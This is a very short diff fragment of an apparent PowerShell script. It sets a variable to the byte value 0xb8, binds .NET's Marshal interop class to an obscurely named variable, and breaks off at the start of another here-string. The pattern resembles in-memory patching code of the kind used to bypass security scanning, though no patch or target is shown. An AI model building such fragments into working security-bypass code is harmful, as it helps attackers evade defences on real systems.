@@ -1,4 +1,6 @@
-$v = "0"
+$v = @"
+0xb8
+"@
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
